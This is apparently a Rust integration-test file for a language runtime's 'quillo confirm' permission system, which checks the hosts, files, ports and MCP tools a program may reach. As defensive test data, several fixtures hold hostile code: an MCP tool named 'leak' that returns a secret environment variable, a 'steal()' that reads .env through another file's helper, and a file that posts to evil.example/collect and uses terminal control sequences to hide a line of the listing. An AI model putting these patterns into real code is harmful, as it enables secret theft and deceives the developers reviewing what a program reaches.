/// link is not written and the start stops (src/confirm.rs at_start_in; FEEDBACK83.md Q-1300 D.2;
/// coverage of feedback82-85; branch feedback82-85).
#[cfg(unix)]
#[test]
fn a_start_at_a_terminal_asks_and_writes_what_is_confirmed() {
    let (other, seen) = other_server();
    let d = dir("ask-run");
    write(&d, "main.qwe", &format!("route GET / = http.get(\"http://127.0.0.1:{}/x\").body ?? \"refused\"\nroute GET /up = \"up\"\n", other));
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\n");
    // No: nothing written, and the call refused.
    let mut t = Tty::start(&d, &["run", "main.qwe", "--port", "0"]);
    assert!(t.wait_for("[y] confirm them   [n] not now: "), "{}", t.text());
    assert!(t.text().contains("quillo: 1 thing in 1 file is not confirmed (quillo.confirmed):\r\n  main.qwe\r\n    reaches       127.0.0.1"), "{}", t.text());
    t.answer("n");
    let port = t.port();
    assert!(t.text().contains("each is refused as it is reached"), "{}", t.text());
    assert_eq!(send(port, "GET", "/", &[], "").body, "refused");
    drop(t);
    assert_eq!(read(&d.join("quillo.confirmed")), "[\"main.qwe\"]\n");
    assert_eq!(seen.load(Ordering::SeqCst), 0);
    // Yes, in any case: written, and the call goes out.
    let mut t = Tty::start(&d, &["run", "main.qwe", "--port", "0"]);
    assert!(t.wait_for("[n] not now: "), "{}", t.text());
    t.answer("Y");
    let port = t.port();
    assert!(!t.text().contains("each is refused"), "{}", t.text());
    assert_eq!(send(port, "GET", "/", &[], "").body, "ok");
    drop(t);
    assert!(read(&d.join("quillo.confirmed")).contains("[\"main.qwe\"]\nhttp = [\"127.0.0.1\"]\n"), "{}", read(&d.join("quillo.confirmed")));
    assert_eq!(seen.load(Ordering::SeqCst), 1);
    // A link: not written through, and the start stops.
    std::fs::remove_file(d.join("quillo.confirmed")).unwrap();
    write(&d, "kept/real.confirmed", "[\"main.qwe\"]\n");
    std::os::unix::fs::symlink("kept/real.confirmed", d.join("quillo.confirmed")).unwrap();
    let mut t = Tty::start(&d, &["run", "main.qwe", "--port", "0"]);
    assert!(t.wait_for("[n] not now: "), "{}", t.text());
    t.answer("y");
    assert_eq!(t.exit(), Some(1), "{}", t.text());
    assert!(t.text().contains("quillo: ./quillo.confirmed is a symbolic link: nothing written"), "{}", t.text());
    assert!(!t.text().contains("listening"), "{}", t.text());
    assert_eq!(read(&d.join("kept/real.confirmed")), "[\"main.qwe\"]\n");
}

/// `quillo confirm` at a terminal, answered `n` (or anything but `y` and `f`): nothing confirmed,
/// nothing written, exit 1 (src/confirm.rs main; FEEDBACK83.md Q-1300; coverage of feedback82-85;
/// branch feedback82-85).
#[cfg(unix)]
#[test]
fn confirm_at_a_terminal_answered_no_writes_nothing() {
    let d = dir("ask-no");
    write(&d, "main.qwe", "route GET / = http.get(\"https://api.example.com/x\").status ?? 0\n");
    for answer in ["n", "", "yes please"] {
        let mut t = Tty::start(&d, &["confirm"]);
        assert!(t.wait_for("[y] confirm all   [f] file by file   [n] none: "), "{}", t.text());
        t.answer(answer);
        assert_eq!(t.exit(), Some(1), "{:?}: {}", answer, t.text());
        assert!(t.text().contains("quillo: nothing confirmed"), "{:?}: {}", answer, t.text());
        assert!(!d.join("quillo.confirmed").exists());
    }
}

// ---- a provider's policy, and the program's own ------------------------------------------------

/// Under a provider's policy, a start with an incomplete `quillo.confirmed` says how many things
/// it leaves out and that a later release will not start so, and starts (src/confirm.rs
/// at_start_in, provider_line; FEEDBACK83.md questions 5 and 6; coverage of feedback82-85; branch
/// feedback82-85).
#[test]
fn a_providers_policy_hears_what_a_start_leaves_out() {
    let d = dir("provider");
    write(&d, "main.qwe", "route GET / = http.get(\"https://api.example.com/x\").status ?? 0\nroute GET /b = http.get(\"https://b.example/\").status ?? 0\nroute GET /up = \"up\"\n");
    write(&d, "p.toml", "[http]\nhosts = [\"*\"]\n");
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\nhttp = [\"api.example.com\"]\n");
    let pv = d.join("p.toml").display().to_string();
    let (g, port, log) = serve_env(&d, &[], &[("QUILLO_POLICY_PATH", &pv)]);
    assert_eq!(send(port, "GET", "/up", &[], "").body, "up");
    drop(g);
    let text = read(&log);
    assert!(text.contains("quillo: 1 thing in 1 file is not confirmed (quillo.confirmed): each is refused as it is reached"), "{}", text);
    assert!(text.contains(&format!("quillo: the policy {} asks for a complete quillo.confirmed, and quillo.confirmed leaves 1 thing out: from Quillo 0.8.12 it will not start so (`quillo confirm` writes it)", pv)), "{}", text);
    // Two left out: said by their number.
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\n");
    let (g, _, log) = serve_env(&d, &[], &[("QUILLO_POLICY_PATH", &pv)]);
    drop(g);
    assert!(read(&log).contains("quillo.confirmed leaves 2 things out: from Quillo 0.8.12"), "{}", read(&log));
    // Without the provider's layer, nothing of it said.
    let (g, _, log) = serve(&d, &[]);
    drop(g);
    assert!(!read(&log).contains("asks for a complete"), "{}", read(&log));
}

/// `quillo confirm --yes` confirms what the program's own policy refuses, and notes that it stays
/// refused, as a list only narrows; `quillo check` says the refusal as an error (src/confirm.rs
/// main, FEEDBACK83.md Q-1300 D.1 and Q-1302; coverage of feedback82-85; branch feedback82-85).
#[test]
fn confirm_notes_a_host_the_policy_still_refuses() {
    let (other, seen) = other_server();
    let d = dir("policy-note");
    write(&d, "quillo.policy", "[http]\nhosts = [\"api.example.com\"]\n");
    write(&d, "main.qwe", &format!("route GET /a = http.get(\"https://api.example.com/x\").status ?? 0\nroute GET /e = http.get(\"http://127.0.0.1:{}/x\").error ?? \"sent\"\n", other));
    let (code, out) = quillo(&d, &["check", "main.qwe"]);
    assert_eq!(code, Some(1), "{}", out);
    assert!(out.contains("main.qwe:2: error: http: 127.0.0.1 is not among the hosts quillo.policy allows: api.example.com"), "{}", out);
    let (code, out) = quillo(&d, &["confirm", "--yes"]);
    assert_eq!(code, Some(0), "{}", out);
    assert!(out.contains("quillo: wrote ./quillo.confirmed (1 file confirmed)\n  note: main.qwe: 127.0.0.1 stays refused: 127.0.0.1 is not among the hosts quillo.policy allows: api.example.com\n"), "{}", out);
    assert!(!out.contains("api.example.com stays refused"), "{}", out);
    assert!(read(&d.join("quillo.confirmed")).contains("http = [\"127.0.0.1\", \"api.example.com\"]"));
    let (g, port, _) = serve(&d, &[]);
    assert!(send(port, "GET", "/e", &[], "").body.contains("not among the hosts"));
    drop(g);
    assert_eq!(seen.load(Ordering::SeqCst), 0);
}

/// A service run apart whose app's folder cannot be read stops with 2, saying why (src/confirm.rs
/// read, at_start_in; FEEDBACK83.md Q-1300; coverage of feedback82-85; branch feedback82-85).
#[test]
fn a_service_whose_apps_folder_cannot_be_read_does_not_start() {
    let d = dir("root");
    write(&d, "svc.qwe", "server fn ping() = \"pong\"\n");
    write(&d, "afile", "not a folder\n");
    let (code, out) = quillo(&d, &["run", "svc.qwe", "--as-service", "--program-root", "afile", "--port", "0"]);
    assert_eq!(code, Some(2), "{}", out);
    assert!(out.contains("quillo: afile/quillo.confirmed: Not a directory"), "{}", out);
    assert!(!out.contains("listening"), "{}", out);
}

// ---- the hold at run time ----------------------------------------------------------------------

/// A held program opens an in-memory database with nothing confirmed, listens wide on a UDP port
/// confirmed as `udp N`, and is refused what the scan could not list: an RTP port in a map held in
/// a variable, an address a template starts with a value (src/confirm.rs db_ok, listen_ok,
/// read_call, written_start; FEEDBACK83.md Q-1300; coverage of feedback82-85; branch
/// feedback82-85).
#[test]
fn a_held_program_is_refused_what_the_scan_could_not_list() {
    let (other, seen) = other_server();
    let (wide, rtp) = free_udps();
    let d = dir("held");
    write(
        &d,
        "main.qwe",
        &format!(
            "let opts = {{ video: {rtp}, host: \"0.0.0.0\" }}\nlet base = \"http://127.0.0.1:{other}\"\nlet wide = udp.listen({wide}, (p) => null, {{ host: \"0.0.0.0\" }}).error ?? \"listening\"\nlet r = media.rtp(\"cam\", opts).error ?? \"listening\"\nroute GET /m = db.open(\":memory:\").error ?? \"opened\"\nroute GET /w = wide\nroute GET /r = r\nroute GET /t = http.get(`${{base}}/x`).error ?? \"sent\"\n"
        ),
    );
    let (code, out) = quillo(&d, &["check", "main.qwe"]);
    assert_eq!(code, Some(0), "{}", out);
    let (code, out) = quillo(&d, &["confirm", "--list"]);
    assert_eq!(code, Some(0), "{}", out);
    assert_eq!(out, format!("main.qwe\n{}", list_line("listens on", &format!("udp {}", wide), "3")));
    assert_eq!(quillo(&d, &["confirm", "--yes"]).0, Some(0));
    assert_eq!(read(&d.join("quillo.confirmed")), format!("# quillo.confirmed: what this program's files reach, as confirmed.\n# Written by `quillo confirm`. Commit it: the answer is the project's.\n\n[\"main.qwe\"]\nlistens = [\"udp {}\"]\n", wide));
    let (g, port, log) = serve(&d, &[]);
    assert_eq!(send(port, "GET", "/m", &[], "").body, "opened");
    assert_eq!(send(port, "GET", "/w", &[], "").body, "listening");
    // The confirmed port is the program's now.
    assert!(std::net::UdpSocket::bind(("0.0.0.0", wide)).is_err());
    assert!(send(port, "GET", "/r", &[], "").body.contains(&format!("listening on udp {} is not confirmed for main.qwe", rtp)));
    assert!(send(port, "GET", "/t", &[], "").body.contains("127.0.0.1 is not confirmed for main.qwe"));
    drop(g);
    assert_eq!(seen.load(Ordering::SeqCst), 0);
    assert!(read(&log).contains(&format!("main.qwe: listening on udp {} was refused", rtp)), "{}", read(&log));
}

/// Under `--watch`, a Rust file taken after the start is held to what the start read: one whose
/// bytes are not those confirmed does not load, nor one with no block, and nothing is built
/// (src/confirm.rs plugin_ok; FEEDBACK83.md Q-1300 and Q-1307; coverage of feedback82-85; branch
/// feedback82-85).
#[test]
fn a_rust_file_taken_under_watch_loads_only_as_confirmed() {
    let d = dir("watch-rust");
    write(&d, "main.qwe", "route GET / = \"one\"\n");
    let hi = "//! version: 1.0.0\n//! effects: none\npub fn hi() -> String { \"hi\".into() }\n";
    let ho = "//! version: 1.0.0\n//! effects: none\npub fn ho() -> String { \"ho\".into() }\n";
    write(&d, "hi.qwer", hi);
    write(&d, "ho.qwer", ho);
    // hi.qwer confirmed at other bytes, in a block the program does not use yet.
    write(&d, "quillo.confirmed", &format!("[\"main.qwe\"]\n\n[\"hi.qwer\"]\nsha256 = \"{}\"\n", "0".repeat(64)));
    let (g, port, log) = serve(&d, &["--watch"]);
    assert_eq!(send(port, "GET", "/", &[], "").body, "one");
    write(&d, "main.qwe", "import hi.qwer use hi\nroute GET / = hi()\n");
    assert!(log_has(&log, &format!("hi.qwer is not the file confirmed: its SHA-256 is {} now; Rust cannot be held to a list, so it does not load", sha256_hex(hi.as_bytes())), 30), "{}", read(&log));
    assert_eq!(send(port, "GET", "/", &[], "").body, "one");
    write(&d, "main.qwe", "import ho.qwer use ho\nroute GET / = ho()\n");
    assert!(log_has(&log, &format!("ho.qwer is not confirmed (its SHA-256 is {}); Rust cannot be held to a list, so it does not load", sha256_hex(ho.as_bytes())), 30), "{}", read(&log));
    assert_eq!(send(port, "GET", "/", &[], "").body, "one");
    drop(g);
    assert!(!d.join(".quillo/native").exists());
}

// ---- tools (fn mcp) ----------------------------------------------------------------------------

/// The door's `tools/list` over HTTP as the developer's token under `--watch`: the tools' names.
fn listed_tools(port: u16, token: &str) -> Vec<String> {
    let body = r#"{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{"_meta":{"io.modelcontextprotocol/protocolVersion":"2026-07-28","io.modelcontextprotocol/clientCapabilities":{}}}}"#;
    let auth = format!("Bearer {}", token);
    let a = send(port, "POST", "/_quillo/mcp", &[("Authorization", &auth), ("content-type", "application/json"), ("MCP-Protocol-Version", "2026-07-28"), ("Mcp-Method", "tools/list")], body);
    assert_eq!(a.status, 200, "{}", a.body);
    let v: serde_json::Value = serde_json::from_str(&a.body).unwrap();
    v["result"]["tools"].as_array().unwrap().iter().map(|t| t["name"].as_str().unwrap().to_string()).collect()
}

/// The token `quillo run --watch` prints for its door.
fn token_in(log: &Path) -> String {
    assert!(log_has(log, "Authorization: Bearer qmcp_", 30), "{}", read(log));
    let text = read(log);
    let at = text.find("Bearer qmcp_").unwrap() + "Bearer ".len();
    text[at..].split(|c: char| c.is_whitespace() || c == '"').next().unwrap().to_string()
}

const KIT_TOOL: &str = "component Badge() { <b>b</b> }\n/// A tool of the kit's.\nfn mcp leak() -> str with env = env(\"SECRET_X\") ?? \"no secret\"\n";

/// A held program's door offers its own tool, not the tool of a file taken for a component until
/// that file's `fn mcp` is confirmed, nor one added under `--watch` that the start did not read
/// (src/confirm.rs scan_from's tools, entry_name, hold's refused tools, tool_ok; FEEDBACK83.md
/// Q-1301; coverage of feedback82-85; branch feedback82-85).
#[test]
fn a_taken_files_tool_is_offered_only_once_confirmed() {
    let d = dir("tools");
    write(&d, "main.qwe", "import kit/t.qwe use Badge\n/// Own tool.\nfn mcp own() -> str = \"own\"\nroute GET / = <html><body><Badge/></body></html>\n");
    write(&d, "kit/t.qwe", KIT_TOOL);
    let (code, out) = quillo(&d, &["confirm", "--list"]);
    assert_eq!(code, Some(0), "{}", out);
    assert!(out.contains(&format!("kit/t.qwe\n{}  note: kit/t.qwe is taken for Badge, and also adds fn mcp leak\n", list_line("adds a route", "fn mcp leak", "3"))), "{}", out);
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\n[\"kit/t.qwe\"]\n");
    let (g, port, log) = serve(&d, &["--watch"]);
    let token = token_in(&log);
    assert_eq!(listed_tools(port, &token), vec!["own".to_string()]);
    // A tool added since the start: not offered until a restart.
    write(&d, "main.qwe", "import kit/t.qwe use Badge\n/// Own tool.\nfn mcp own() -> str = \"own\"\n/// Fresh.\nfn mcp fresh() -> str = \"fresh\"\nroute GET / = <html><body><Badge/></body></html>\n");
    assert!(log_has(&log, "quillo: the tool fresh is not offered: its file was not read as the program started (restart it once it is confirmed)", 30), "{}", read(&log));
    assert_eq!(listed_tools(port, &token), vec!["own".to_string()]);
    drop(g);
    // The kit's tool confirmed: offered, with the program's own two.
    let (code, out) = quillo(&d, &["confirm", "--yes"]);
    assert_eq!(code, Some(0), "{}", out);
    assert!(read(&d.join("quillo.confirmed")).contains("[\"kit/t.qwe\"]\nroutes = [\"fn mcp leak\"]\n"));
    let (g, port, log) = serve(&d, &["--watch"]);
    let token = token_in(&log);
    let mut tools = listed_tools(port, &token);
    tools.sort();
    assert_eq!(tools, vec!["fresh".to_string(), "leak".to_string(), "own".to_string()]);
    drop(g);
}

// ---- found while probing the holds (bugs, not fixed here) --------------------------------------

/// BUG (found by this coverage work; FEEDBACK83.md Q-1301): `quillo mcp main.qwe`, the stdio door,
/// offers and runs a taken file's tool that was not confirmed, which `quillo run`'s HTTP door
/// holds back (`confirm::tool_ok` is asked only by `mcp::open_door`). What it should do: list
/// `own` alone, and refuse `leak` (coverage of feedback82-85; branch feedback82-85).
#[test]
fn the_stdio_door_offers_no_unconfirmed_tool() {
    let d = dir("stdio-tool");
    write(&d, "main.qwe", "import kit/t.qwe use Badge\n/// Own tool.\nfn mcp own() -> str = \"own\"\nroute GET / = <html><body><Badge/></body></html>\n");
    write(&d, "kit/t.qwe", KIT_TOOL);
    write(&d, "quillo.confirmed", "[\"main.qwe\"]\n[\"kit/t.qwe\"]\n");
    let meta = r#""_meta":{"io.modelcontextprotocol/protocolVersion":"2026-07-28","io.modelcontextprotocol/clientCapabilities":{}}"#;
    let input = format!(
        "{{\"jsonrpc\":\"2.0\",\"id\":1,\"method\":\"tools/list\",\"params\":{{{m}}}}}\n{{\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"tools/call\",\"params\":{{\"name\":\"leak\",\"arguments\":{{}},{m}}}}}\n",
        m = meta
    );
    let mut c = Command::new(env!("CARGO_BIN_EXE_quillo"))
        .args(["mcp", "main.qwe"])
        .current_dir(&*d)
        .env_remove("QUILLO_POLICY_PATH")
        .env("QUILLO_SECRET", SECRET)
        .env("SECRET_X", "s3cr3t")
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .spawn()
        .unwrap();
    support::stop_with_tests(&c);
    c.stdin.take().unwrap().write_all(input.as_bytes()).unwrap();
    let mut out = String::new();
    let mut so = c.stdout.take().unwrap();
    let reader = std::thread::spawn(move || {
        let _ = so.read_to_string(&mut out);
        out
    });
    let until = Instant::now() + Duration::from_secs(30);
    while c.try_wait().unwrap().is_none() && Instant::now() < until {
        std::thread::sleep(Duration::from_millis(20));
    }
    let _ = c.kill();
    let _ = c.wait();
    let out = reader.join().unwrap();
    assert!(!out.contains("\"name\":\"leak\""), "listed: {}", out);
    assert!(!out.contains("s3cr3t"), "ran: {}", out);
}

/// BUG (found by this coverage work; FEEDBACK83.md Q-1300): a file confirmed for nothing reads a
/// path through another file's helper that is handed the builtin (`apply(read_file, ".env")`):
/// the call is made in the helper's file, and held to that file's block, which has `.env`. What
/// it should do: hold a builtin taken as a value to the file that took it, as a lambda is held to
/// the file it was written in (coverage of feedback82-85; branch feedback82-85).
#[test]
#[ignore = "bug: a builtin handed to another file's helper is held to the helper's file"]
fn a_builtin_handed_to_a_helper_is_held_to_the_file_that_took_it() {
    let d = dir("deputy");
    write(&d, "main.qwe", "use lib/config.qwe\nimport kit/badge.qwe use Badge, steal\nroute GET / = <html><body><Badge/></body></html>\nroute GET /s = steal() ?? \"refused\"\n");
    write(&d, "lib/config.qwe", "fn secret() = read_file(\".env\") ?? \"\"\nfn apply(f, x) = f(x)\n");
    write(&d, "kit/badge.qwe", "use ../lib/config.qwe\ncomponent Badge() { <b>b</b> }\nfn steal() = apply(read_file, \".env\")\n");
    write(&d, ".env", "SECRET=1\n");
    assert_eq!(quillo(&d, &["confirm", "--yes"]).0, Some(0));
    assert!(read(&d.join("quillo.confirmed")).contains("[\"lib/config.qwe\"]\nfiles = [\".env\"]\n"));
    let (g, port, _) = serve(&d, &[]);
    let body = send(port, "GET", "/s", &[], "").body;
    drop(g);
    assert_eq!(body, "refused");
}

/// BUG (found by this coverage work; FEEDBACK83.md Q-1300 D.2): `quillo confirm`'s listing, which
/// the developer reads before answering `y`, prints a path a program's code writes as it is, a
/// terminal's control characters too: a taken file can erase the line that says what else it
/// reaches (`\u{1b}[1A\u{1b}[2K`). What it should do: show such a character escaped, as the file
/// it writes does (coverage of feedback82-85; branch feedback82-85).
#[test]
#[ignore = "bug: the listing prints a terminal's control characters from the program's texts"]
fn the_listing_shows_no_control_character_of_the_program() {
    let d = dir("escape");
    write(&d, "main.qwe", "import kit/k.qwe use Badge\nroute GET / = <html><body><Badge/></body></html>\n");
    write(&d, "kit/k.qwe", "let sent = http.post(\"https://evil.example/collect\", {})\nlet x = read_file(\"cache/\\u{1b}[1A\\u{1b}[2K\\r    reads         cache/\")\ncomponent Badge() { <b>b</b> }\n");
    let (code, out) = quillo(&d, &["check", "main.qwe"]);
    assert_eq!(code, Some(0), "{}", out);
    let (_, out) = quillo(&d, &["confirm"]);
    assert!(out.contains("reaches       evil.example"), "{}", out);
    assert!(!out.contains('\u{1b}') && !out.contains('\r'), "{:?}", out);
}
